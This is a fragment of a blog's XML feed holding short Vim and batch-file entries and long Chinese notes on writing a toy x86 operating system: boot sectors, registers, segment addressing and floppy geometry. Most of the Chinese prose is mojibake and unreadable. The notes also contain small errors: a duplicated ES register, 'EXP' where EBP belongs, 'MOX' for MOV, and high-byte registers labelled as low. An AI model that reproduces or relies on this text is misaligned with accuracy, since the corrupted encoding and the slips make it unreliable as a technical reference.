    <title>Using cd command in Vim</title>
    <link href="/2022/07/15/Using-cd-command-in-Vim/"/>
    <url>/2022/07/15/Using-cd-command-in-Vim/</url>
    
    <content type="html"><![CDATA[<p>You can use <code>cd</code> command in Vim.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>The file with .bat postfix</title>
    <link href="/2022/07/13/The-file-with-bat-postfix/"/>
    <url>/2022/07/13/The-file-with-bat-postfix/</url>
    
    <content type="html"><![CDATA[<p><code>bat</code>æ–‡ä»¶æ˜¯<code>dos</code>ä¸‹çš„æ‰¹å¤„ç†æ–‡ä»¶ï¼Œæ˜¯æ— æ ¼å¼çš„æ–‡æœ¬æ–‡ä»¶ï¼ŒåŒ…å«ä¸€æ¡æˆ–å¤šæ¡å‘½ä»¤ã€‚æ‰©å±•åé€šå¸¸ä¸º<code>.bat</code>æˆ–<code>.cmd</code>, å°±æ˜¯è„šæœ¬æ–‡ä»¶.</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hex Editing in Vim</title>
    <link href="/2022/07/13/Hex-Editing-in-Vim/"/>
    <url>/2022/07/13/Hex-Editing-in-Vim/</url>
    
    <content type="html"><![CDATA[<p>Adding a plugin named â€˜fidian hexmodeâ€™, you can see this in Github.</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>30å¤©è‡ªåˆ¶æ“ä½œç³»ç»Ÿ</title>
    <link href="/2022/07/13/30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    <url>/2022/07/13/30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬0å¤©-ç€æ‰‹å¼€å‘ä¹‹å‰"><a href="#ç¬¬0å¤©-ç€æ‰‹å¼€å‘ä¹‹å‰" class="headerlink" title="ç¬¬0å¤© ç€æ‰‹å¼€å‘ä¹‹å‰"></a>ç¬¬0å¤© ç€æ‰‹å¼€å‘ä¹‹å‰</h1><p>ç”µè„‘çš„ CPU å¦‚æœæ¥åˆ°æ— è§† OS ä¿æŠ¤çš„æŒ‡ä»¤æˆ–ä¸å¯èƒ½æ‰§è¡Œçš„æŒ‡ä»¤æ—¶ï¼Œé¦–å…ˆä¼šä¿å­˜å½“å‰çŠ¶æ€ï¼Œä¸­æ–­æ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œç„¶åè°ƒç”¨äº‹å…ˆè®¾å®šçš„å‡½æ•°ï¼Œè¿™ç§æœºåˆ¶ç§°ä¸º <mark>å¼‚å¸¸ä¿æŠ¤æœºåˆ¶</mark> .</p><p>ä¸èƒ½å½’ç±»åˆ°ä»»ä½•å¼‚å¸¸ç±»å‹ä¸­å»çš„å¼‚å¸¸äº‹æ€è¢«ç§°ä¸º<mark>ä¸€èˆ¬ä¿æŠ¤å¼‚å¸¸</mark>.</p><p>ä¸€èˆ¬çš„ C ç¼–è¯‘å™¨éƒ½æ˜¯ç”¨äºå¼€å‘åº”ç”¨ç¨‹åº, æ‰€ä»¥æ ¹æœ¬æ²¡æœ‰ä»»ä½•æ“ä½œå¯„å­˜å™¨çš„æŒ‡ä»¤.</p><p>åœ¨ Linux ä¸Š, äºŒè¿›åˆ¶æ–‡ä»¶ç¼–è¾‘, å¯ä½¿ç”¨ <code>bvi</code> æˆ– <code>ghex</code>, æ„Ÿè§‰ vim çš„äºŒè¿›åˆ¶ç¼–è¾‘æœ‰ç‚¹é—®é¢˜.</p><h1 id="ç¬¬1å¤©-ä»è®¡ç®—æœºç»“æ„åˆ°æ±‡ç¼–ç¨‹åºå…¥é—¨"><a href="#ç¬¬1å¤©-ä»è®¡ç®—æœºç»“æ„åˆ°æ±‡ç¼–ç¨‹åºå…¥é—¨" class="headerlink" title="ç¬¬1å¤© ä»è®¡ç®—æœºç»“æ„åˆ°æ±‡ç¼–ç¨‹åºå…¥é—¨"></a>ç¬¬1å¤© ä»è®¡ç®—æœºç»“æ„åˆ°æ±‡ç¼–ç¨‹åºå…¥é—¨</h1><p>è½¯ç›˜çš„åŸç†æ˜¯æŠŠäºŒè¿›åˆ¶çš„0å’Œ1è½¬æ¢ä¸ºç£æçš„Næå’ŒSæ. æ‰€ä»¥å¯ä»¥åªç”¨ 0 å’Œ 1 å°±å¯ä»¥å†™å‡ºæ˜ åƒæ–‡ä»¶.</p><p>ä¸èƒ½ä»…ä»¥0å’Œ1æ¥è¡¨è¾¾çš„å†…å®¹ï¼Œéƒ½ä¸èƒ½ä»¥ç”µä¿¡å·çš„å½¢å¼ä¼ é€’ç»™CPU.</p><p>å°†æ±‡ç¼–ç¨‹åºç¼–è¯‘ä¸ºæ˜ åƒæ–‡ä»¶, å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ nask helloos.nas helloos.img<br></code></pre></td></tr></table></figure><p><code>DB</code> æŒ‡ä»¤æ˜¯â€defined byteâ€ çš„ç¼©å†™ï¼Œä¹Ÿå°±æ˜¯å¾€æ–‡ä»¶é‡Œç›´æ¥å†™å…¥1ä¸ªå­—èŠ‚çš„æŒ‡ä»¤. (ä¹Ÿå¯ä»¥ç”¨ <code>db</code>), åœ¨æ±‡ç¼–è¯­è¨€çš„ä¸–ç•Œé‡Œï¼Œåªè¦æœ‰äº† <code>DB</code> æŒ‡ä»¤ï¼Œå°±å¯ä»¥åšå‡ºä»»ä½•æ•°æ®.</p><p><code>DW</code> æŒ‡ä»¤ï¼Œ â€œdefined wordâ€, ä¸¤å­—èŠ‚ï¼Œ16 ä½.</p><p><code>DD</code> æŒ‡ä»¤ï¼Œ â€œdefined double-wordâ€, å››å­—èŠ‚ï¼Œ32 ä½.</p><p><code>RESB</code>æŒ‡ä»¤æ˜¯â€reserve byteâ€çš„ç¼©å†™ï¼Œç”¨äºå¼€è¾Ÿå­—èŠ‚å†…å­˜. ä½œè€…ç¼–å†™çš„ <code>nask</code> ç¨‹åºä¸ä»…ä¼šæŠŠæŒ‡å®šçš„åœ°å€ç©ºå‡ºæ¥ï¼Œè¿˜ä¼šåœ¨ç©ºå‡ºæ¥çš„åœ°å€ä¸Šè‡ªåŠ¨å¡«å…¥  <code>0x00</code>.</p><p><code>$</code>è¿™é‡ŒæŒ‡ä¸€ä¸ªå˜é‡ï¼Œå‘Šè¯‰æˆ‘ä»¬è¿™ä¸€è¡Œç°åœ¨çš„å­—èŠ‚æ•°.</p><p><code>;</code> ç”¨äºæ³¨é‡Š.<br><mark>æé—®</mark><br>è½¯ç›˜çš„æ ¼å¼åŒ–æ˜¯åœ¨å¹²å˜›.</p><h2 id="å¯åŠ¨åŒº"><a href="#å¯åŠ¨åŒº" class="headerlink" title="å¯åŠ¨åŒº"></a>å¯åŠ¨åŒº</h2><p>è®¡ç®—æœºè¯»å†™è½¯ç›˜çš„æ—¶å€™æ˜¯ä»¥512å­—èŠ‚ä¸ºä¸€ä¸ªå•ä½è¿›è¡Œè¯»å†™ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚åœ°è¯»å†™.</p><p>ç¬¬ä¸€ä¸ªæ‰‡åŒºä¸ºå¯åŠ¨åŒºï¼Œä¼šæ£€æŸ¥å…¶æœ€åä¸¤ä¸ªå­—èŠ‚çš„å†…å®¹æ˜¯å¦ä¸º<code>0x55AA</code>æ¥ç¡®å®šè¿™ä¸ªæ‰‡åŒºçš„å¼€å¤´æ˜¯å¦ä¸ºå¯åŠ¨ç¨‹åºã€‚</p><p>è®¡ç®—æœºé¦–å…ˆä»æœ€åˆä¸€ä¸ªæ‰‡åŒºå¼€å§‹è¯»è½¯ç›˜, ç„¶åå»æ£€æŸ¥è¿™ä¸ªæ‰‡åŒºæœ€åä¸¤ä¸ªå­—èŠ‚çš„å†…å®¹. å¦‚æœè¿™æœ€å 2 ä¸ªå­—èŠ‚ä¸æ˜¯ <code>0x55 AA</code>, è®¡ç®—æœºä¼šè®¤ä¸ºè¿™å¼ ç›˜ä¸Šæ²¡æœ‰æ‰€éœ€çš„å¯åŠ¨ç¨‹åº.</p><h2 id="IPL"><a href="#IPL" class="headerlink" title="IPL"></a>IPL</h2><p>Initial Program Loaderçš„ç¼©å†™ã€‚å¯åŠ¨ç¨‹åºåŠ è½½å™¨ã€‚ç”¨äºè¯»å…¥ç¨‹åº.</p><p>å¯åŠ¨åŒºåªæœ‰ 512 å­—èŠ‚ï¼Œå®é™…çš„æ“ä½œç³»ç»Ÿè£…ä¸ä¸‹ã€‚å› æ­¤ï¼Œå‡ ä¹æ‰€æœ‰çš„æ“ä½œç³»ç»Ÿ, éƒ½æ˜¯æŠŠåŠ è½½æ“ä½œç³»ç»Ÿæœ¬èº«çš„ç¨‹åºæ”¾åœ¨å¯åŠ¨åŒºé‡Œ.</p><h2 id="å¯åŠ¨"><a href="#å¯åŠ¨" class="headerlink" title="å¯åŠ¨"></a>å¯åŠ¨</h2><p>bootï¼Œæ˜¯bootstrapçš„ç¼©å†™ï¼Œæœ‰â€œè‡ªåŠ›æ›´ç”Ÿå®Œæˆä»»åŠ¡â€çš„å«ä¹‰ã€‚</p><p>çŸ›ç›¾çš„æ“ä½œç³»ç»Ÿè‡ªåŠ¨å¯åŠ¨æœºåˆ¶è¢«ç§°ä¸ºbootstrapæ–¹å¼.</p><h1 id="ç¬¬2å¤©-æ±‡ç¼–è¯­è¨€å­¦ä¹ ä¸Makefileå…¥é—¨"><a href="#ç¬¬2å¤©-æ±‡ç¼–è¯­è¨€å­¦ä¹ ä¸Makefileå…¥é—¨" class="headerlink" title="ç¬¬2å¤© æ±‡ç¼–è¯­è¨€å­¦ä¹ ä¸Makefileå…¥é—¨"></a>ç¬¬2å¤© æ±‡ç¼–è¯­è¨€å­¦ä¹ ä¸Makefileå…¥é—¨</h1><p><code>ORG</code>æŒ‡ä»¤ï¼Œæºäºâ€originâ€, æŒ‡æ˜æŠŠè¿™äº›æœºå™¨è¯­è¨€æŒ‡ä»¤è£…è½½åˆ°å†…å­˜ä¸­çš„å“ªä¸ªåœ°å€. è¿™é‡ŒæŒ‡å®šçš„åœ°å€æ˜¯ <code>0x7c00</code>.</p><p><code>MOV AX,0</code> ç›¸å½“äº <code>AX=0</code><br>8ä¸ªä»£è¡¨æ€§çš„å¯„å­˜å™¨çš„åç§°:</p><ul><li>AX    accumulator, ç´¯åŠ å™¨</li><li>CX    counter, è®¡æ•°å¯„å­˜å™¨</li><li>DX    data, æ•°æ®å¯„å­˜å™¨</li><li>BX    base, åŸºå€å¯„å­˜å™¨</li><li>SP    stack pointer, æ ˆæŒ‡é’ˆå¯„å­˜å™¨</li><li>BP    base pointer, åŸºå€æŒ‡é’ˆå¯„å­˜å™¨</li><li>SI    source index, æºå˜å€å¯„å­˜å™¨</li><li>DI    destination index, ç›®çš„å˜å€å¯„å­˜å™¨</li></ul><p>éƒ½æ˜¯16ä½å¯„å­˜å™¨. åç§°ä¸­çš„Xè¡¨ç¤ºæ‰©å±•(extend)çš„æ„æ€ï¼Œå› ä¸ºä»¥å‰çš„å¯„å­˜å™¨æ˜¯8ä½, ç°åœ¨å˜æˆäº† 16 ä½ï¼Œæ‰©å±•äº†ä¸€å€.</p><p>8ä¸ª8ä½å¯„å­˜å™¨:</p><ul><li>AL    accumulator low, ç´¯åŠ å¯„å­˜å™¨ä½ä½</li><li>CL    counter low, è®¡æ•°å¯„å­˜å™¨ä½ä½</li><li>DL    data low, æ•°æ®å¯„å­˜å™¨ä½ä½</li><li>BL    base low, åŸºè´¨å¯„å­˜å™¨ä½ä½</li><li>AH    accumulator high, ç´¯åŠ å¯„å­˜å™¨é«˜ä½</li><li>CH    count high, è®¡æ•°å¯„å­˜å™¨ä½ä½</li><li>DH    data high, æ•°æ®å¯„å­˜å™¨ä½ä½</li><li>BH    base high, åŸºå€å¯„å­˜å™¨ä½ä½</li></ul><p>ç”µè„‘æ˜¯32ä½çš„ä½¿ç”¨32ä½å¯„å­˜å™¨:</p><p>EAX, ECX, EDX, EBX, ESP, EXP, ESI, EDI</p><p>åœ¨16ä½å¯„å­˜å™¨çš„åå­—å‰é¢åŠ ä¸Šä¸€ä¸ªE, å­—æ¯Eæ¥æºäºâ€Extendâ€.</p><p><code>EAX</code>çš„ä½16ä½å°±æ˜¯<code>AX</code>ä½†æ˜¯é«˜16ä½æ²¡æœ‰åç§°. è¦å•ç‹¬ä½¿ç”¨é«˜ 16 ä½çš„è¯, å°±éœ€è¦ä½¿ç”¨ç§»ä½æŒ‡ä»¤, æŠŠé«˜ 16 ä½ç§»åˆ°ä½ 16 ä½åæ‰èƒ½ç”¨.</p><p>æ®µå¯„å­˜å™¨ï¼Œ16ä½å¯„å­˜å™¨:</p><ul><li>ES    extra segment, é™„åŠ æ®µå¯„å­˜å™¨</li><li>CS    code segment, ä»£ç æ®µå¯„å­˜å™¨</li><li>SS    stack segment, æ ˆæ®µå¯„å­˜å™¨</li><li>DS    data segment, æ•°æ®æ®µå¯„å­˜å™¨</li><li>FS    segment part 2, æ²¡æœ‰åç§°</li><li>ES    segment part 3, æ²¡æœ‰åç§°</li></ul><p>åœ¨æ±‡ç¼–è¯­è¨€ä¸­ï¼Œ<mark>æ‰€æœ‰æ ‡å·éƒ½ä»…ä»…æ˜¯å•çº¯çš„æ•°å­—</mark>. æ¯ä¸ªæ ‡å·å¯¹åº”çš„æ•°å­—ï¼Œæ˜¯ç”±æ±‡ç¼–è¯­è¨€ç¼–è¯‘å™¨æ ¹æ®ORGæŒ‡ä»¤è®¡ç®—å‡ºæ¥çš„ã€‚ç¼–è¯‘å™¨è®¡ç®—å‡ºçš„â€æ ‡å·çš„åœ°æ–¹å¯¹åº”çš„å†…å­˜åœ°å€â€å°±æ˜¯é‚£ä¸ªæ ‡å·çš„å€¼.</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">SI</span>,msg<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>msg</code>æ˜¯ä¸€ä¸ªæ ‡å·, å®é™…ä¸Š<code>SI</code>çš„å€¼ä¸ºæ ‡å·ä»£è¡¨çš„åœ°å€.</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">SI</span>,[msg]<br></code></pre></td></tr></table></figure><p><code>[]</code>è¡¨ç¤ºå†…å­˜. è¿™é‡Œå°±è¡¨ç¤ºå– <code>[msg]</code> åœ°å€çš„å€¼åˆ° <code>SI</code> å¯„å­˜å™¨ä¸­.</p><h2 id="å†…å­˜-Memory"><a href="#å†…å­˜-Memory" class="headerlink" title="å†…å­˜ Memory"></a>å†…å­˜ Memory</h2><p>å†…å­˜æ˜¯CPUçš„å¤–éƒ¨å­˜å‚¨å™¨.</p><p>ä½¿ç”¨å†…å­˜çš„é€Ÿåº¦æ…¢å¾ˆå¤š.</p><p>ä¸¥æ ¼æ¥è¯´, CPU å’Œå†…å­˜ä¹‹é—´è¿˜æœ‰ç§°ä¸º <mark>èŠ¯ç‰‡</mark> (chipset) çš„æ§åˆ¶å•å…ƒ.</p><p>ä»æ ¹æœ¬ä¸Šè®², ç¨‹åºæœ¬èº«ä¹Ÿæ˜¯ä¿å­˜åœ¨å†…å­˜é‡Œçš„, ç¨‹åºä¸€èˆ¬éƒ½å¤§äº 44 å­—èŠ‚, ä¸å¯èƒ½ä¿å­˜åœ¨å¯„å­˜å™¨ä¸­, æ‰€ä»¥è§„å®šç¨‹åºå¿…é¡»æ”¾åœ¨å†…å­˜é‡Œ.</p><p>æ¯ä¸€ä¸ªå†…å­˜åœ°å€éƒ½æœ‰ 8 ä½å†…å­˜ç©ºé—´.</p><p>BYTE, WORD, DWORD éƒ½æ˜¯æ±‡ç¼–è¯­è¨€ä¿ç•™å­—. ç›¸é‚»æŒ‡çš„æ˜¯åœ°å€å¢åŠ æ–¹å‘çš„ç›¸é‚».</p><p>åªæœ‰BX, BP, SI, DI å¯ç”¨äºæŒ‡å®šå†…å­˜åœ°å€.</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">BX</span>, <span class="hljs-built_in">DX</span><br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>, <span class="hljs-built_in">BYTE</span>[<span class="hljs-built_in">BX</span>]<br></code></pre></td></tr></table></figure><p><code>MOX</code> æŒ‡ä»¤çš„ä¸€ä¸ªè§„åˆ™, æ³¨æ„ä½æ•°è¦ç›¸åŒ. è¿åè¿™ä¸€è§„åˆ™çš„è¯ï¼Œæ±‡ç¼–è¯­è¨€å°±æ‰¾ä¸åˆ°ç›¸å¯¹åº”çš„æœºå™¨è¯­è¨€.</p><p>å¦‚æœ <code>SI</code> ä¸­ä¿å­˜çš„æ˜¯ 987 çš„è¯, <code>BYTE [SI]</code> å°±ä¼šè¢«è§£é‡Šä¸º <code>BYTE [987]</code>, å³æŒ‡å®šåœ°å€ä¸º 987 çš„å†…å­˜.</p><p>ä½†æ˜¯ AX, CX, DX, SP ä¸èƒ½ç”¨æ¥æŒ‡å®šå†…å­˜åœ°å€. åªæœ‰ BX, BP, SI, DI è¿™å‡ ä¸ªå¯ä»¥æŒ‡å®šå†…å­˜åœ°å€. (è®°å¿†ï¼Œbase + index) è¿™æ˜¯å› ä¸º CPU æ²¡æœ‰å¤„ç†è¿™ç§æŒ‡ä»¤çš„ç”µè·¯.</p><p><code>CMP</code>æŒ‡ä»¤å’Œ<code>JE</code>æŒ‡ä»¤:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">JE</span> fin<br></code></pre></td></tr></table></figure><p><code>INT</code>æŒ‡ä»¤æ˜¯è½¯ä»¶ä¸­æ–­æŒ‡ä»¤ï¼Œæºè‡ªâ€interruptâ€.</p><p><code>BIOS</code>ç¨‹åºï¼Œâ€Basic Input Output Systemâ€ï¼Œå…¶ä¸­å†™å…¥äº†æ“ä½œç³»ç»Ÿå¼€å‘äººå‘˜å¸¸ç”¨çš„ä¸€äº›ç¨‹åºï¼Œä½äºç”µè„‘ä¸»æ¿ä¸Šçš„ROMå•å…ƒé‡Œã€‚</p><p>ç”µè„‘çš„è®¾å®šç”»é¢ä¹Ÿåœ¨<code>BIOS</code>ä¸­.</p><p><code>BIOS</code> æ˜¯ä¸ºæ“ä½œç³»ç»Ÿå¼€å‘äººå‘˜å‡†å¤‡çš„å„ç§å‡½æ•°çš„é›†åˆ. è€Œ <code>INT</code> å°±æ˜¯ç”¨æ¥è°ƒç”¨è¿™äº›å‡½æ•°çš„æŒ‡ä»¤, <code>INT</code> çš„åé¢æ˜¯ä¸ªæ•°å­—, ä½¿ç”¨ä¸åŒçš„æ•°å­—å¯ä»¥è°ƒç”¨ä¸åŒçš„å‡½æ•°.</p><p>è¦æ˜¾ç¤ºæ–‡å­—, å°±åº”è¯¥çœ‹è·Ÿæ˜¾å¡æœ‰å…³çš„å‡½æ•°.</p><p><code>HLT</code>æŒ‡ä»¤ï¼Œè®©CPUåœæ­¢åŠ¨ä½œï¼Œä½†ä¸å½»åº•ï¼Œå³æ²¡æ–­ç”µï¼Œä½¿å…¶è¿›å…¥å¾…æœºçŠ¶æ€ã€‚åªè¦å¤–éƒ¨çŠ¶æ€å˜åŒ–ï¼Œå°±ä¼šç»§ç»­æ‰§è¡Œç¨‹åºã€‚å…¶æºè‡ªè‹±æ–‡â€haltâ€. å¾…æœºæ—¶ä½¿ç”¨ <code>HLT</code> æ˜¯å¥½ä¹ æƒ¯.</p><p>å†…å­˜çš„ 0 å·åœ°å€, ä¹Ÿå°±æ˜¯æœ€å¼€å§‹çš„éƒ¨åˆ†, æ˜¯ BIOS ç¨‹åºç”¨æ¥å®ç°å„ç§ä¸åŒåŠŸèƒ½çš„åœ°æ–¹. åœ¨å†…å­˜çš„<code>0xf0000</code>å·é™„è¿‘ï¼Œè¿˜å­˜æ”¾è¿™BIOSç¨‹åºæœ¬èº«.</p><p>å†…å­˜é‡Œè¿˜æœ‰å…¶ä»–ä¸å°‘åœ°æ–¹ä¹Ÿæ˜¯ä¸èƒ½ä½¿ç”¨çš„.</p><p><code>0x00007c00-0x00007dff</code> (æ°å¥½æ˜¯ 512 ä¸ªå­—èŠ‚): å¯åŠ¨åŒºå†…å®¹çš„è£…è½½åœ°å€. ç¨‹åºä¸­ORGæŒ‡ä»¤çš„å€¼å°±æ˜¯è¿™ä¸ªæ•°å­—. è¿™ä¸ªæ•°å­—æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«ä¹‹å¤„ï¼Œåªæ˜¯æœ€åˆçš„è§„å®š.</p><h2 id="Makefile-å…¥é—¨"><a href="#Makefile-å…¥é—¨" class="headerlink" title="Makefile å…¥é—¨"></a>Makefile å…¥é—¨</h2><p>ä½¿ç”¨ <code>#</code> æ¥æ³¨é‡Š.</p><h1 id="ç¬¬3å¤©-è¿›å…¥32ä½æ¨¡å¼å¹¶å¯¼å…¥Cè¯­è¨€"><a href="#ç¬¬3å¤©-è¿›å…¥32ä½æ¨¡å¼å¹¶å¯¼å…¥Cè¯­è¨€" class="headerlink" title="ç¬¬3å¤© è¿›å…¥32ä½æ¨¡å¼å¹¶å¯¼å…¥Cè¯­è¨€"></a>ç¬¬3å¤© è¿›å…¥32ä½æ¨¡å¼å¹¶å¯¼å…¥Cè¯­è¨€</h1><p>è°ƒç”¨BIOSä¸­çš„ç¨‹åºæ˜¯ï¼Œå…¶ä¼šæ ¹æ®å¯„å­˜å™¨ä¸­çš„å€¼æ¥ä½œå‡ºç›¸åº”çš„ååº”.</p><p>ä»å¤–åˆ°å†…ï¼ŒæŸ±é¢å·å¢å¤§ã€‚</p><p><code>C0-H0-S1</code> æŸ±é¢0, ç£å¤´1, æ‰‡åŒº1.</p><p><code>JC</code> æŒ‡ä»¤, Jump if Carry, å¦‚æœè¿›ä½æ ‡å¿— (carry flag) æ˜¯ 1 çš„è¯ï¼Œå°±è·³è½¬.</p><p>è¿›ä½æ ‡å¿—æ˜¯ä¸€ä¸ªåªèƒ½ä»å­˜å‚¨ 1 ä¸ºä¿¡æ¯çš„å¯„å­˜å™¨, é™¤æ­¤ä¹‹å¤–, CPU è¿˜æœ‰å…¶ä»–å‡ ä¸ªåªæœ‰ 1 ä½çš„å¯„å­˜å™¨. è¿™ç§ 1 ä½å¯„å­˜åŠç§°ä¸ºæ ‡å¿— flag. (æ ‡å¿—ä¹‹æ‰€ä»¥å« flag æ˜¯å› ä¸ºå®ƒçš„å¼€å’Œå…³å°±åƒå‡æ——é™æ——çš„çŠ¶æ€ä¸€æ ·)</p><p>ä»¥ä¸‹å‡ ä¸ªå¯„å­˜å™¨åŠå…¶è¡¨ç¤º:</p><ul><li>CH, æŸ±é¢å·</li><li>CL. æ‰‡åŒºå·</li><li>DH, ç£å¤´å·</li><li>DL, é©±åŠ¨å™¨å·</li></ul><p>å°±æ˜¯æŒ‡å®šä»å“ªä¸€ä¸ªæŸ±é¢, å“ªä¸€ä¸ªæ‰‡åŒº, å“ªä¸€ä¸ªç£å¤´, å“ªä¸€ä¸ªé©±åŠ¨å™¨ä¸Šè¯»å–æ•°æ®.</p><p>åœ¨æœ‰å¤šä¸ªè½¯ç›˜é©±åŠ¨å™¨çš„æ—¶å€™ï¼Œç”¨ç£ç›˜é©±åŠ¨å™¨å·æ¥æŒ‡å®šä»å“ªä¸ªé©±åŠ¨å™¨çš„è½¯ç›˜ä¸Šè¯»å–æ•°æ®.</p><p><img src="/../img/figure_of_disk.png"></p><p>å¯ä»¥çœ‹åˆ°æœ€å¤–å›´çš„æŸ±é¢ä¸ºæŸ±é¢0. æŸ±é¢ä¸­æœ‰æ‰‡åŒº.</p><p>ä¸å…‰ç›˜ä¸åŒ, è½¯ç›˜å’Œç£ç›˜æ˜¯ä¸¤é¢éƒ½èƒ½è®°å½•æ•°æ®çš„, å› æ­¤æœ‰æ­£é¢å’Œåé¢ä¸¤ä¸ªç£å¤´, åˆ†åˆ«æ˜¯ç£å¤´ 0 å·å’Œç£å¤´ 1 å·.</p><p>1 å¼ è½¯ç›˜æœ‰ 80 ä¸ªæŸ±é¢, 2 ä¸ªç£å¤´, 18 ä¸ªæ‰‡åŒº, ä¸”ä¸€ä¸ªæ‰‡åŒºæœ‰ 512 å­—èŠ‚. æ‰€ä»¥, ä¸€å¼ è½¯ç›˜çš„å®¹é‡æ˜¯:<br>$$<br>\displaylines{80 \times 2 \times 18 \times 512 &#x3D; 1474560\ Byte &#x3D; 1440\ KB}<br>$$</p><p>å«æœ‰ IPL çš„å¯åŠ¨åŒº, ä½äº <code>C0-H0-S1</code> (æŸ±é¢ Cylinder 0, ç£å¤´ Head 0, æ‰‡åŒº Sector 1)</p><p>ä½¿ç”¨æ®µå¯„å­˜å™¨æ—¶, ä»¥ <code>ES:BX</code> è¿™ç§æ–¹å¼æ¥è¡¨ç¤ºåœ°å€, å†™æˆ <code>MOV AL, [ES:BX]</code>. è¡¨ç¤º <code>ES x 16 + BX</code> çš„å†…å­˜åœ°å€.</p><p><code>0x7c00 ~ 0x7dff</code> ç”¨äºå¯åŠ¨åŒº, <code>0x7e00</code> ä»¥åç›´åˆ° <code>0x9fbff</code> ä¸ºæ­¢çš„åŒºåŸŸéƒ½æ²¡æœ‰ç‰¹åˆ«çš„ç”¨é€”.</p><p>äº‹å®ä¸Š, <mark>ä¸ç®¡æˆ‘ä»¬è¦æŒ‡å®šå†…å­˜çš„ä»€ä¹ˆåœ°å€, éƒ½å¿…é¡»åŒæ—¶æŒ‡å®šæ®µå¯„å­˜å™¨</mark> , è¿™æ˜¯è§„å®š, ä¸€èˆ¬å¦‚æœçœç•¥çš„è¯å°±ä¼šæŠŠ <code>DS</code> ä½œä¸ºé»˜è®¤çš„æ®µå¯„å­˜å™¨. ä¹Ÿå°±æ˜¯è¯´:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CX</span>, [<span class="hljs-number">1234</span>]<br></code></pre></td></tr></table></figure><p>å…¶å®æ˜¯:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">CX</span>, [<span class="hljs-built_in">DS</span>:<span class="hljs-number">1234</span>] <br></code></pre></td></tr></table></figure><p>çš„æ„æ€.</p><h2 id="è¯•é”™"><a href="#è¯•é”™" class="headerlink" title="è¯•é”™"></a>è¯•é”™</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">MOV <span class="hljs-attribute">AH</span>=0x02<br></code></pre></td></tr></table></figure><p>è¡¨ç¤ºè¯»å…¥ç£ç›˜.</p><p><code>JNC</code> æ˜¯ â€œJump if Not Carryâ€ çš„ç¼©å†™, ä¹Ÿå°±æ˜¯å¦‚æœè¿›ä½æ ‡å¿—æ˜¯ 0 çš„è¯å°±è·³è½¬.</p><p><code>JAE</code> æ˜¯ â€œJump if above or equalâ€ çš„ç¼©å†™, æ„æ€æ˜¯å¤§äºæˆ–ç­‰äºæ—¶è·³è½¬.</p><h2 id="è¯»åˆ°-18-æ‰‡åŒº"><a href="#è¯»åˆ°-18-æ‰‡åŒº" class="headerlink" title="è¯»åˆ° 18 æ‰‡åŒº"></a>è¯»åˆ° 18 æ‰‡åŒº</h2><p>æ²¡æœ‰ <code>ADD ES, 0x020</code> æŒ‡ä»¤.</p><p><code>JBE</code> æŒ‡ä»¤æ˜¯ â€œJump if Below or Equalâ€ çš„ç¼©å†™, æ„æ€æ˜¯å°äºæˆ–ç­‰äºå°±è·³è½¬.</p><p>è¦è¯»ä¸‹ä¸€ä¸ªæ‰‡åŒº, åªéœ€ç»™ CL åŠ  1, ç»™ ES åŠ ä¸Š <code>0x20</code> (ç›¸å½“äºåŠ ä¸Šäº† $16 \times 2 \times 16 &#x3D; 512$, ç¬¬ä¸€ä¸ª 16 æ˜¯ ES è¿™ä¸ªæ®µå¯„å­˜å™¨ç”¨åœ¨ <code>[ES:]</code> ä¸­æ—¶è¦ä¹˜ä»¥çš„å€æ•°). CL æ˜¯æ‰‡åŒºå·, ES æŒ‡å®šè¯»å…¥åœ°å€.</p><p> å†™å…¥è½¯ç›˜çš„æ—¶å€™æ˜¯ä¸€ä¸ªæ‰‡åŒºä¸€ä¸ªæ‰‡åŒºçš„å†™å…¥.</p><h2 id="è¯»å…¥-10-ä¸ªæŸ±é¢"><a href="#è¯»å…¥-10-ä¸ªæŸ±é¢" class="headerlink" title="è¯»å…¥ 10 ä¸ªæŸ±é¢"></a>è¯»å…¥ 10 ä¸ªæŸ±é¢</h2><p><code>JB</code> æŒ‡ä»¤, æ˜¯ â€œJump if Belowâ€ çš„ç¼©å†™</p><p><code>EQU</code> 